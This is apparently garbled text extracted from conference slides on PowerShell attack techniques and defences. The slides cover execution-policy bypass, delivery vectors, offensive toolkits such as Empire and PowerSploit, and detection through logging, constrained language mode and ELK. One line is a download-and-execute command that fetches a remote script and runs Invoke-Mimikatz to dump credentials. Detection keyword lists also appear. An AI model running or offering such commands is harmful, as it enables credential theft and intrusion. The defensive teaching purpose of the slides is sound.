KCon
Powershell
360 (@sanr)

Get-Host

 360 WIFI  
  weibo.com/0xls ssssanr@gmail.com github.com/ssssanr

CONTENTS
PowerShell powershell Powershell
PowerShell

%95 Powershell

PowerShell

PowerShell

linux Bash

.Net 

WMI Log Registry ....

Windows API .NET

 

PowerShell
Powershell $PSVersionTable

PowerShell Version 2 Version 3 Version 4 Version 5

Desktop OS Windows 7 Windows 8 Windows 8.1 Windows 10

Server OS Windows 2008 R2
Windows 2012 Windows 2012 R2
Windows 2016

PowerShell?

powershell

    Windows API.Net

PowerShell

PowerShell

  
Restricted

 
AllSigned

  
Remote Signed


Unrestricted

PowerShell
Restricted ---- PS1 

Bypass PowerShell
 PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1  powershell "IEX (New-Object
Net.WebClient).DownloadString(`a.com/a.ps'); InvokeMimikatz

powershell
 PowerShellWindows()   System.Management.Automation.dll (DLL)  .Netpowershell

.Netpowershell

.Netpowershell

Powershell



VBA

Wmi



CHM

HTA

Js/Vbs

Office VBA-PowerShell

Js-PowerShell

HTA -powershell

CHM -powershell

PowerShell Tools - Attack
 Empire  Inveigh  Nishang  PowerCat  PowerSploit

 Invoke-TheHash  WMImplant  OWA-Toolkit  PowerUpSQL  SessionGopher

Empire
http://www.powershellempire.com/

PowerSploit- PowerView
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

SessionGopher
https://github.com/fireeye/SessionGopher

Powershell

Powershell 

Powershell 
PowerShell3 >
> > >Windows
Windows powershell: Module Logging psv3 Script Block Logging psv5
EncodedCommand XOR, Base64, ROT13

PowerShell Module Logging

Module Logging

Module Logging
Invoke-Expression (IEX)

Module Logging
.Net Web Clientdownload

Invoke-Mimikatz
"mimikatz" "gentilkiwi"

Invoke-Mimikatz
System.Reflection.AssemblyName SE_PRIVILEGE_ENABLED System.Reflection.Emit.AssemblyBuilderAccess

PowerShell Script Block Logging

Script Block Logging

Encoded

Script Block Logging Encoded

 

PowerShell Constrained mode

FullLanguage) RestrictedLanguage() NoLanguage () ConstrainedLanguage


$ExecutionContext.SessionState.LanguageMo de
 [Environment]::SetEnvironmentVariable('__PSL ockdownPolicy', '4', 'Machine') ()
\\ Windows\

PowerShell Constrained mode

PowerShell Constrained mode

ELK PowerShell
ElasticSearch Logstash  Kibana Winlogbeat  ElasticSearch Kibana elastalert

ELK PowerShell

Thank you!

